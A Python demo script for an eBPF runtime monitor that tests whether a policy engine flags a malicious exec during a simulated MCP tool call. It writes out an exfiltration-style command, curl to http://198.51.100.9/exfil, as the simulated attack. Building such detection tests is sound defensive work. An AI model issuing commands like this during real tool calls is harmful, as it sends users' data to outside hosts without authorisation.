#!/usr/bin/env python3
"""Live eBPF demo: real kernel exec capture + real policy engine.

Runs on Linux (root) with the eBPF-enabled binary. It:
  1. starts a long-lived workload shell in its own process group,
  2. drives the real mcpfz-probe eBPF sidecar via the real SidecarRuntimeMonitor,
  3. scopes the probe to the workload's process group,
  4. opens a "call" window and makes the workload exec a malicious-looking
     command (curl), then closes the window,
  5. execs a benign command outside any call window (ambient),
  6. runs the real policy engine over what the KERNEL actually observed.

This is the genuine end-to-end path the fuzzer would use, with real eBPF doing
the observation — no scripted events.
"""

from __future__ import annotations

import os
import subprocess
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))

from mcpfz_probe import RuntimePolicy, SidecarRuntimeMonitor, evaluate_events

BIN = str(Path(__file__).resolve().parent.parent / "target" / "debug" / "mcpfz-probe")


def main() -> int:
    # A long-lived workload shell that is its own process-group leader.
    workload = subprocess.Popen(
        ["bash", "--norc", "-s"],
        stdin=subprocess.PIPE,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        start_new_session=True,  # setsid -> pgid == pid
        text=True,
    )
    pgid = os.getpgid(workload.pid)
    print(f"[demo] workload shell pid={workload.pid} pgid={pgid}")

    def workload_run(cmd: str) -> None:
        assert workload.stdin is not None
        workload.stdin.write(cmd + "\n")
        workload.stdin.flush()
        time.sleep(0.4)  # let the exec happen and the ring buffer drain

    monitor = SidecarRuntimeMonitor(command=[BIN, "--backend", "ebpf"])
    monitor.start()
    time.sleep(0.3)  # let BPF load + attach
    try:
        monitor.set_scope_pgid(pgid, generation=1)
        time.sleep(0.2)

        # --- malicious tool call: exec curl inside the call window ---
        monitor.begin_call("call-evil", "fetch_url")
        workload_run("/usr/bin/curl -s http://198.51.100.9/exfil || true")
        evil = monitor.end_call("call-evil")

        # --- benign activity outside any call window (ambient) ---
        workload_run("/usr/bin/id")
        ambient = monitor.ambient_events()
    finally:
        monitor.stop()
        try:
            workload.stdin.close()
        except Exception:
            pass
        workload.terminate()

    print("\n[demo] === events the KERNEL attributed to the malicious call ===")
    for e in evil.events:
        print("   ", e.to_json())
    print("[demo] === ambient events ===")
    for e in ambient:
        print("   ", e.to_json())

    # Real policy engine over real kernel observations.
    policy = RuntimePolicy(
        workspace=Path("/root/mcpfz-probe"),
        tmpdir=Path("/tmp"),
        exec_allow=("/usr/bin/id", "/bin/bash", "/usr/bin/bash"),  # benign allowlist
    )
    print("\n[demo] === findings for the malicious call ===")
    evil_findings = evaluate_events(evil.events, policy)
    for f in evil_findings:
        print(f"    [{f.severity}] {f.category}: {f.detail}")

    ok = any(
        f.category == "runtime.exec" and "curl" in f.detail for f in evil_findings
    )
    print(f"\n[demo] RESULT: {'PASS' if ok else 'FAIL'} "
          f"- kernel-observed curl exec {'was' if ok else 'was NOT'} flagged")
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
